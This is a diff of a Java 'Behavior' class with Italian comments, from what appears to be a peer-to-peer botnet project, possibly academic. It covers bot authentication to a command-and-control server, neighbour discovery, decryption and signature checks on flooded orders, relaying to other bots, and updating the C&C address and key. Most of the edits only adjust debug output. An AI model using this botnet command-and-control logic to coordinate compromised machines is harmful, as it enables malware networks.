@@ -75,10 +75,12 @@ public class Behavior {
 	 */
 	public void initializeBot() {
 		// nServ.firstConnectToMockServerDns();
+		//TODO Se già ho un ID Controllo se sono gia iscritto e salto challenge
 		if (challengeToCommandConquer()) {
-			System.out.println("Bot is Ready");
+			System.out.println("intizialize bot completed");
 		} else
-			System.out.println("Bot not Ready, authentication failed");
+			System.out.println("Bot authentication failed");
+			//System.out.println("Bot not Ready, authentication failed");
 		String data = nServ.getIdHash();
 		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
 		List<Pairs<String, String>> response = null;
@@ -86,14 +88,14 @@ public class Behavior {
 		List<Pairs<IP, PublicKey>> newNeighbours = new ArrayList<Pairs<IP, PublicKey>>();
 
 		if (response != null) {
-			response.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
+			response.forEach(ob -> System.out.println("vicinato " + ob.getValue1().toString()));
 		} else
-			System.out.println("torno null");
+			System.out.println("risposta vicini null");
 		newNeighbours = nServ.tramsuteNeigha(response);
 		if (newNeighbours != null) {
-			newNeighbours.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
+			newNeighbours.forEach(ob -> System.out.println("vicinato convertito " + ob.getValue1().toString()));
 		} else
-			System.out.println("torno null");
+			System.out.println("risposta vicini senza elementi");
 		nServ.getNeighbours().setAll(newNeighbours);
 		SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
 		buf.setAll(newNeighbours);
@@ -162,26 +164,26 @@ public class Behavior {
 		String msg = "";
 
 		// decritta il msg
-		System.out.println("rawdata: " + rawData);
+		System.out.println("newFlood");
 		msg = pki.getCrypto().decryptAES(rawData);
 		if (msg == null)
 			return;
-		System.out.println("msg: " + msg.toString());
+	//	System.out.println("msg: " + msg.toString());
 		// Per comodità
 		String[] msgs = msg.split("<HH>");
 
-		for (int i = 0; i < msgs.length; i++) {
-			System.out.println("msgs[" + i + "]= " + msgs[i]);
-		}
+//		for (int i = 0; i < msgs.length; i++) {
+//			System.out.println("msgs[" + i + "]= " + msgs[i]);
+//		}
 
 		// hai gia ricevuto questo msg? bella domanda
 		if (msgHashList.indexOfValue2(msgs[0]) < 0) {
-			System.out.println("idHashMessage " + msgs[0]);
+			//System.out.println("idHashMessage " + msgs[0]);
 			System.out.println("NUOVO ORDINE DA ESEGUIRE");
 			// verifica la firma con chiave publica c&c
 			try {
-				System.out.println("signature" + msgs[2]);
-				System.out.println(" pk " + pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
+			//	System.out.println("signature" + msgs[2]);
+				//System.out.println(" pk " + pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
 				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],
 						nServ.getCommandConquerIps().getList().get(0).getValue2())) {
 					Pairs<Integer, String> data = new Pairs<>();
@@ -210,14 +212,8 @@ public class Behavior {
 
 	@Async
 	private void floodNeighoours(String msg, IP ip) {
-
-		System.out.println("size lista " + nServ.getNeighbours().getList().size());
 		List<Pairs<IP,PublicKey>> listNeighbourst=nServ.getNeighbours().getList();
 		for (Pairs<IP, PublicKey> p : listNeighbourst) {
-			// IP test = p.getValue1();
-//			Object x = p.getValue1();
-//			IP test = new IP(x.toString());
-//			System.out.println("dsasaddavvvvvv " + test.getIp());
 			 if (!ip.getIp().equals(p.getValue1().getIp())) {
 			 req.sendFloodToOtherBot(p.getValue1(), msg);
 			 System.out.println("flood vicino "+ p.getValue1().getIp());
@@ -265,6 +261,7 @@ public class Behavior {
 		nServ.getCommandConquerIps().getList().remove(0);
 		Pairs<IP, PublicKey> pairs = new Pairs<IP, PublicKey>(new IP(msgs[1]), pki.rebuildPuK(msgs[2]));
 		nServ.getCommandConquerIps().add(pairs);
+		//Svuota lista sg (verrano riiutati in automatico in quanto fimrati con chiave vecchia)
 		System.out.println("CeC UPDATED!!!");
 		
 	}
@@ -322,7 +319,7 @@ public class Behavior {
 		for (String str : graph) {
 			String[] sts = str.split("<HH>");
 			for (int i = 0; i < sts.length; i++) {
-				System.out.println("pasrse edge " + i + " " + sts[i]);
+				System.out.println("parse edge " + i + " " + sts[i]);
 			}
 			edge.add(new Pairs<IP, IP>(new IP(sts[0]), new IP(sts[1])));
 			if (!vertex.contains(new IP(sts[0])))
